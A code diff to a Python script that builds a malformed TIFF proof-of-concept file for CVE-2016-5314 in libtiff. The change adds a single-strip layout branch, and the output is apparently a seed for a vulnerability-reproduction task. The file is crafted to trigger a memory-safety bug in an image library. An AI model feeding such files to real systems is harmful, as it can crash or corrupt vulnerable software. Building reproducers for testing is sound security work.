@@ -47,11 +47,6 @@ def build_poc():
     # Compute layout offsets
     header_len = len(header)           # 8
     ifd_len = len(ifd)
-    strip_offsets_offset = header_len + ifd_len
-    strip_offsets_size = num_strips * 4
-    strip_bytecounts_offset = strip_offsets_offset + strip_offsets_size
-    strip_bytecounts_size = num_strips * 4
-    payload_offset = strip_bytecounts_offset + strip_bytecounts_size
 
     # Helper to replace the 4-byte value field for a tag in the IFD
     def set_ifd_value(ifd_bytes, tag_to_set, new_val):
@@ -64,16 +59,32 @@ def build_poc():
                 return ifd_bytes[:val_pos] + struct.pack("<I", new_val) + ifd_bytes[val_pos + 4:]
         raise ValueError(f"tag {tag_to_set} not found in IFD")
 
-    # Patch the offsets into the IFD
-    ifd = set_ifd_value(ifd, 273, strip_offsets_offset)
-    ifd = set_ifd_value(ifd, 279, strip_bytecounts_offset)
+    # For a single strip TIFF, TIFF convention stores the strip offset and bytecount
+    # directly in the tag value (no separate arrays). For multiple strips we store
+    # arrays after the IFD and point tags to those offsets.
+    if num_strips == 1:
+        payload_offset = header_len + ifd_len
+        ifd = set_ifd_value(ifd, 273, payload_offset)            # StripOffset = payload start
+        ifd = set_ifd_value(ifd, 279, len(zlib_payload))        # StripByteCount = compressed size
+        payload_data = zlib_payload
+        return header + ifd + payload_data
+    else:
+        strip_offsets_offset = header_len + ifd_len
+        strip_offsets_size = num_strips * 4
+        strip_bytecounts_offset = strip_offsets_offset + strip_offsets_size
+        strip_bytecounts_size = num_strips * 4
+        payload_offset = strip_bytecounts_offset + strip_bytecounts_size
 
-    # Build strip arrays and payload
-    strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
-    strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
-    payload_data = zlib_payload * num_strips
+        # Patch the offsets into the IFD
+        ifd = set_ifd_value(ifd, 273, strip_offsets_offset)
+        ifd = set_ifd_value(ifd, 279, strip_bytecounts_offset)
 
-    return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data
+        # Build strip arrays and payload
+        strip_offsets_data = b"".join(struct.pack("<I", payload_offset + i * len(zlib_payload)) for i in range(num_strips))
+        strip_bytecounts_data = b"".join(struct.pack("<I", len(zlib_payload)) for _ in range(num_strips))
+        payload_data = zlib_payload * num_strips
+
+        return header + ifd + strip_offsets_data + strip_bytecounts_data + payload_data
 
 
 output_path = os.path.abspath(os.path.join(os.path.dirname(__file__), "..", "tasks", "CVE-2016-5314_libtiff", "seeds", "poc.tiff"))
